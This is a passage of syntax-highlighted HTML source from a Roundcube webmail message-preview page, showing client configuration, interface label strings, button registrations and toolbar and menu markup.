class="string">&quot;image/jpeg&quot;</span>,<span class="string">&quot;image/gif&quot;</span>,<span class="string">&quot;image/png&quot;</span>,<span class="string">&quot;image/bmp&quot;</span>,<span class="string">&quot;image/tiff&quot;</span>,<span class="string">&quot;image/webp&quot;</span>,<span class="string">&quot;application/x-javascript&quot;</span>,<span class="string">&quot;application/pdf&quot;</span>,<span class="string">&quot;message/rfc822&quot;</span>],<span class="string">&quot;read_when_deleted&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;display_next&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;optional_format&quot;</span>:<span class="string">&quot;text&quot;</span>,<span class="string">&quot;mailboxes&quot;</span>:&#123;<span class="string">&quot;INBOX&quot;</span>:&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;INBOX&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Inbox&quot;</span>,<span class="string">&quot;virtual&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;inbox&quot;</span>&#125;&#125;,<span class="string">&quot;mailboxes_list&quot;</span>:[<span class="string">&quot;INBOX&quot;</span>],<span class="string">&quot;request_token&quot;</span>:<span class="string">&quot;QpdT8JMZkK0l5s23G8KkDNgOQl7p9Cca&quot;</span>&#125;);</span><br><span class="line">rcmail.add_label(&#123;<span class="string">&quot;loading&quot;</span>:<span class="string">&quot;Loading...&quot;</span>,<span class="string">&quot;servererror&quot;</span>:<span class="string">&quot;Server Error!&quot;</span>,<span class="string">&quot;connerror&quot;</span>:<span class="string">&quot;Connection Error (Failed to reach the server)!&quot;</span>,<span class="string">&quot;requesttimedout&quot;</span>:<span class="string">&quot;Request timed out&quot;</span>,<span class="string">&quot;refreshing&quot;</span>:<span class="string">&quot;Refreshing...&quot;</span>,<span class="string">&quot;windowopenerror&quot;</span>:<span class="string">&quot;The popup window was blocked!&quot;</span>,<span class="string">&quot;uploadingmany&quot;</span>:<span class="string">&quot;Uploading files...&quot;</span>,<span class="string">&quot;uploading&quot;</span>:<span class="string">&quot;Uploading file...&quot;</span>,<span class="string">&quot;close&quot;</span>:<span class="string">&quot;Close&quot;</span>,<span class="string">&quot;save&quot;</span>:<span class="string">&quot;Save&quot;</span>,<span class="string">&quot;cancel&quot;</span>:<span class="string">&quot;Cancel&quot;</span>,<span class="string">&quot;alerttitle&quot;</span>:<span class="string">&quot;Attention&quot;</span>,<span class="string">&quot;confirmationtitle&quot;</span>:<span class="string">&quot;Are you sure...&quot;</span>,<span class="string">&quot;delete&quot;</span>:<span class="string">&quot;Delete&quot;</span>,<span class="string">&quot;continue&quot;</span>:<span class="string">&quot;Continue&quot;</span>,<span class="string">&quot;ok&quot;</span>:<span class="string">&quot;OK&quot;</span>,<span class="string">&quot;checkingmail&quot;</span>:<span class="string">&quot;Checking for new messages...&quot;</span>,<span class="string">&quot;deletemessage&quot;</span>:<span class="string">&quot;Delete message&quot;</span>,<span class="string">&quot;movemessagetotrash&quot;</span>:<span class="string">&quot;Move message to trash&quot;</span>,<span class="string">&quot;movingmessage&quot;</span>:<span class="string">&quot;Moving message(s)...&quot;</span>,<span class="string">&quot;deletingmessage&quot;</span>:<span class="string">&quot;Deleting message(s)...&quot;</span>,<span class="string">&quot;markingmessage&quot;</span>:<span class="string">&quot;Marking message(s)...&quot;</span>,<span class="string">&quot;replyall&quot;</span>:<span class="string">&quot;Reply all&quot;</span>,<span class="string">&quot;replylist&quot;</span>:<span class="string">&quot;Reply list&quot;</span>,<span class="string">&quot;bounce&quot;</span>:<span class="string">&quot;Resend&quot;</span>,<span class="string">&quot;bouncemsg&quot;</span>:<span class="string">&quot;Resend (bounce)&quot;</span>,<span class="string">&quot;sendingmessage&quot;</span>:<span class="string">&quot;Sending message...&quot;</span>,<span class="string">&quot;back&quot;</span>:<span class="string">&quot;Back&quot;</span>,<span class="string">&quot;errortitle&quot;</span>:<span class="string">&quot;An error occurred!&quot;</span>,<span class="string">&quot;options&quot;</span>:<span class="string">&quot;Options&quot;</span>,<span class="string">&quot;plaintoggle&quot;</span>:<span class="string">&quot;Plain text&quot;</span>,<span class="string">&quot;htmltoggle&quot;</span>:<span class="string">&quot;HTML&quot;</span>,<span class="string">&quot;previous&quot;</span>:<span class="string">&quot;Previous&quot;</span>,<span class="string">&quot;next&quot;</span>:<span class="string">&quot;Next&quot;</span>,<span class="string">&quot;select&quot;</span>:<span class="string">&quot;Select&quot;</span>,<span class="string">&quot;browse&quot;</span>:<span class="string">&quot;Browse&quot;</span>,<span class="string">&quot;choosefile&quot;</span>:<span class="string">&quot;Choose file...&quot;</span>,<span class="string">&quot;choosefiles&quot;</span>:<span class="string">&quot;Choose files...&quot;</span>,<span class="string">&quot;purgefolderconfirm&quot;</span>:<span class="string">&quot;Do you really want to delete all messages in this folder?&quot;</span>,<span class="string">&quot;deletemessagesconfirm&quot;</span>:<span class="string">&quot;Do you really want to delete selected message(s)?&quot;</span>,<span class="string">&quot;viewsource&quot;</span>:<span class="string">&quot;Show source&quot;</span>,<span class="string">&quot;details&quot;</span>:<span class="string">&quot;Details&quot;</span>,<span class="string">&quot;summary&quot;</span>:<span class="string">&quot;Summary&quot;</span>,<span class="string">&quot;arialabelmessageheaders&quot;</span>:<span class="string">&quot;Message headers&quot;</span>&#125;);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;toolbar&quot;</span>,<span class="string">&quot;mailtoolbar&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;forwardmenu&quot;</span>,<span class="string">&quot;forward-menu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;replyallmenu&quot;</span>,<span class="string">&quot;replyall-menu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;messagemenu&quot;</span>,<span class="string">&quot;message-menu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;markmenu&quot;</span>,<span class="string">&quot;markmessage-menu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;headerlinks&quot;</span>,<span class="string">&quot;header-links&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;attachmentmenu&quot;</span>,<span class="string">&quot;attachmentmenu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;mailtomenu&quot;</span>,<span class="string">&quot;mailto-menu&quot;</span>);rcmail.register_button(<span class="string">&#x27;compose&#x27;</span>, <span class="string">&#x27;rcmbtn100&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;reply&#x27;</span>, <span class="string">&#x27;rcmbtn101&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;reply&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;reply-all&#x27;</span>, <span class="string">&#x27;rcmbtn102&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;reply-all&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;forward&#x27;</span>, <span class="string">&#x27;rcmbtn103&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;forward&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;rcmbtn104&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;rcmbtn105&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;previousmessage&#x27;</span>, <span class="string">&#x27;rcmbtn106&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;prev&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;nextmessage&#x27;</span>, <span class="string">&#x27;rcmbtn107&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;forward-inline&#x27;</span>, <span class="string">&#x27;rcmbtn108&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;forward inline active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;forward-attachment&#x27;</span>, <span class="string">&#x27;rcmbtn109&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;forward attachment active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;bounce&#x27;</span>, <span class="string">&#x27;rcmbtn110&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;forward bounce active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;reply-all&#x27;</span>, <span class="string">&#x27;rcmbtn111&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;reply all active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;reply-list&#x27;</span>, <span class="string">&#x27;rcmbtn112&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;reply list active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;rcmbtn113&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;print active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;rcmbtn114&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;download active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;edit&#x27;</span>, <span class="string">&#x27;rcmbtn115&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;edit asnew active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;viewsource&#x27;</span>, <span class="string">&#x27;rcmbtn116&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;source active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;move&#x27;</span>, <span class="string">&#x27;rcmbtn117&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;move active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;rcmbtn118&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;copy active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;rcmbtn119&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;extwin active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;mark&#x27;</span>, <span class="string">&#x27;rcmbtn120&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;read active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;mark&#x27;</span>, <span class="string">&#x27;rcmbtn121&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;unread active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;mark&#x27;</span>, <span class="string">&#x27;rcmbtn122&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;flag active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;mark&#x27;</span>, <span class="string">&#x27;rcmbtn123&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;unflag active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;change-format&#x27;</span>, <span class="string">&#x27;rcmbtn124&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.gui_object(<span class="string">&#x27;remoteobjectsmsg&#x27;</span>, <span class="string">&#x27;remote-objects-message&#x27;</span>);</span><br><span class="line">rcmail.gui_object(<span class="string">&#x27;messagebody&#x27;</span>, <span class="string">&#x27;messagebody&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;open-attachment&#x27;</span>, <span class="string">&#x27;attachmenuopen&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;extwin active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;download-attachment&#x27;</span>, <span class="string">&#x27;attachmenudownload&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;download active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.gui_object(<span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;messagestack&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=<span class="string">&quot;plugins/jqueryui/js/jquery-ui.min.js?s=1716107237&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=<span class="string">&quot;task-mail action-show&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;div <span class="built_in">id</span>=<span class="string">&quot;layout&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1 class=<span class="string">&quot;voice&quot;</span>&gt;Message preview&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;layout-content&quot;</span> class=<span class="string">&quot;selected&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;h2 <span class="built_in">id</span>=<span class="string">&quot;aria-label-toolbar&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Application toolbar&lt;/h2&gt;</span><br><span class="line">		&lt;div class=<span class="string">&quot;header&quot;</span> role=<span class="string">&quot;toolbar&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-toolbar&quot;</span>&gt;</span><br><span class="line">			&lt;a class=<span class="string">&quot;button icon back-list-button&quot;</span> href=<span class="string">&quot;#back&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Back&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">			&lt;span class=<span class="string">&quot;header-title&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">			</span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;mailtoolbar&quot;</span> class=<span class="string">&quot;toolbar menu&quot;</span> role=<span class="string">&quot;toolbar&quot;</span>&gt;</span><br><span class="line">	&lt;a class=<span class="string">&quot;compose hidden&quot;</span> title=<span class="string">&quot;Create a new message&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn100&quot;</span> role=<span class="string">&quot;button&quot;</span> href=<span class="string">&quot;/?_task=mail&amp;amp;_action=compose&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Compose&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	&lt;a class=<span class="string">&quot;reply disabled&quot;</span> title=<span class="string">&quot;Reply to sender&quot;</span> data-content-button=<span class="string">&quot;true&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn101&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;reply&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Reply&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	&lt;span class=<span class="string">&quot;dropbutton&quot;</span>&gt;</span><br><span class="line">		&lt;a class=<span class="string">&quot;reply-all disabled&quot;</span> title=<span class="string">&quot;Reply to list or to sender and all recipients&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn102&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;reply-all&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Reply all&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">		&lt;a href=<span class="string">&quot;#reply-all&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;replyallmenulink&quot;</span> class=<span class="string">&quot;dropdown&quot;</span> data-popup=<span class="string">&quot;replyall-menu&quot;</span> tabindex=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">			&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Reply-all options&lt;/span&gt;</span><br><span class="line">		&lt;/a&gt;</span><br><span class="line">	&lt;/span&gt;</span><br><span class="line">	&lt;span class=<span class="string">&quot;dropbutton&quot;</span>&gt;</span><br><span class="line">		&lt;a class=<span class="string">&quot;forward disabled&quot;</span> title=<span class="string">&quot;Forward the message&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn103&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;forward&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Forward&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">		&lt;a href=<span class="string">&quot;#forward&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;forwardmenulink&quot;</span> class=<span class="string">&quot;dropdown&quot;</span> data-popup=<span class="string">&quot;forward-menu&quot;</span> tabindex=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">			&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Forwarding options&lt;/span&gt;</span><br><span class="line">		&lt;/a&gt;</span><br><span class="line">	&lt;/span&gt;</span><br><span class="line">	&lt;span class=<span class="string">&quot;spacer&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">	&lt;a class=<span class="string">&quot;delete disabled&quot;</span> title=<span class="string">&quot;Delete message&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn104&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;delete&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Delete&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;a class=<span class="string">&quot;print disabled&quot;</span> title=<span class="string">&quot;Print this message&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn105&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;print&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Print&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	&lt;a <span class="built_in">id</span>=<span class="string">&quot;markmessagemenulink&quot;</span> class=<span class="string">&quot;markmessage&quot;</span> title=<span class="string">&quot;Mark messages&quot;</span> data-popup=<span class="string">&quot;markmessage-menu&quot;</span> role=<span class="string">&quot;button&quot;</span> href=<span class="string">&quot;#&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Mark&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	&lt;a <span class="built_in">id</span>=<span class="string">&quot;messagemenulink&quot;</span> class=<span class="string">&quot;more&quot;</span> title=<span class="string">&quot;More actions...&quot;</span> data-popup=<span class="string">&quot;message-menu&quot;</span> role=<span class="string">&quot;button&quot;</span> href=<span class="string">&quot;#&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;More&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;span class=<span class="string">&quot;spacer&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">		&lt;a class=<span class="string">&quot;prev disabled&quot;</span> title=<span class="string">&quot;Show previous message&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn106&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;previousmessage&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Previous&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">		&lt;a class=<span class="string">&quot;next disabled&quot;</span> title=<span class="string">&quot;Show next message&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn107&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;nextmessage&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Next&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;forward-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-forward-menu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Forwarding options&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-forward-menu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;forward inline disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn108&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;forward-inline&#x27;,&#x27;sub&#x27;,this,event)&quot;</span>&gt;Forward inline&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;forward attachment disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn109&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;forward-attachment&#x27;,&#x27;sub&#x27;,this,event)&quot;</span>&gt;Forward as attachment&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;forward bounce disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn110&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;bounce&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Resend (bounce)&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;replyall-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-replyall-menu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Reply-all options&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-replyall-menu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;reply all disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn111&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;reply-all&#x27;,&#x27;sub&#x27;,this,event)&quot;</span>&gt;Reply all&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;reply list disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn112&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;reply-list&#x27;,&#x27;sub&#x27;,this,event)&quot;</span>&gt;Reply list&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;message-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-message-menu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;More message actions&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-message-menu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;print disabled&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn113&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;print&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Print this message&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;download disabled&quot;</span> 